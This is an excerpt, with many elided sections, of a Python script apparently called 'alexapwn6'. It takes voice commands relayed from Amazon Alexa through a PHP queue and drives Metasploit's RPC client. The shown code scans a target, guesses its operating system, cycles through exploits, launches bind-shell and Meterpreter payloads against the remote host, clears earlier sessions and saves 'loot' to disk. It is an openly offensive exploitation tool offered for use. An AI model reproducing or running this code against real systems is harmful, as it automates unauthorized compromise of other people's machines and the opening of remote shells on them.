...
import unicodedata
try:
    import alexapwn6cfg as cfg
except:
    print("I need alexapwn6cfg.py edited to your specs and comipled to .pyc so I can import the settings.");
...
def write_loot_to_downloads(loot,filnam):
    ...
    finalpath = os.path.join(finalpath, filnam)
    try:
        f = open(finalpath,'w+')
        f.write(loot)
        f.close()
    except:
        print("crap file didn't write to" + finalpath)
...
StopMeNow = False
urlfromAlexa = cfg.kalicfg['Kali_Read']            # 'https://www.yourdomain.com/Kali_Read.php'
urltoAlexa =  cfg.kalicfg['Kali2Alexa']            #'https://www.yourdoain.com/Kali2Alexa.php'

if "example.com" in urlfromAlexa or "example.com" in urltoAlexa:
    print("You need to change the domains pointing to your queue in the alexapwncfg.py file to the url where you are hosting your PHP queue.\n Your PHP queue file names should also be unique to you.")
    sys.exit(1)
...
payload= ''
rport= '0'
lport = cfg.kalicfg['default_lport']        #'4000'
exploits = ''
sessions=''
consoles=''
error=''
...
try:
    cli = MsfRpcClient(username='msf',password ='test',ssl=False, port=cfg.kalicfg['default_msfrpc_port'])    #55553)   #if need to change the username and password for msfrpc here is where you do it
except:
...
while (StopMeNow == False):
    ...
    try:
        ...
        if cmd == 'scan':
            ...
            portstatus = portstatus.lower()
            print ("port status = " + portstatus)
            if 'microsoft' in  portstatus:
                windows = "True"
            elif 'unix' in portstatus:
                windows = "False"
            elif 'linux' in portstatus:
                windows = "False"
            else:
                windows = "True"
        ...
        if cmd == 'use exploit':
            ...
            try:
                ...
                print ("Exploit set to " + expl + " failed! Due to: " + e)
                continue
        ...
        if cmd == 'exploit':
            ...
            print("rhost =" + rhost)
            try:
                cli.sessions.session(1).stop()
                print("Killed session 1 from last hack.")
            except:
                print (".")
            try:
                cli.sessions.session(2).stop()
                print("Killed session 2 from last hack.")
            except:
                print (".")
            try:
                cli.sessions.session(3).stop()
                print("Killed session 3 from last hack.")
            except:
                print (".")
            try:
                cli.sessions.session(4).stop()
                print("Killed session 4 from last hack.")
            except:
                print (".")
            ...
            for z in varz:
                try:
                    ...
                    try:
                        ...
                        print ("Exploit set to " + expl + " failed!  " + ef)
                        continue
                    ...
                    if any("COLLECTOR" in s for s in ex.required):
                        ex['COLLECTOR'] = ''
                        print ('SSL ver=' + ex['SSLVersion'])
                    ...
                    if windows == "True": 
                        ...
                        if any('windows/meterpreter/bind_tcp' in p for p in payloads):
                            ...
                            ex.execute(payload=ex.payloads[2]) # would be generic/shell_bind_tcp
    ...
    #                    sys.stdout.flush()
                    ...
                    print('That exploit had complicating factors- skipping...')
                    continue
                    #else continue
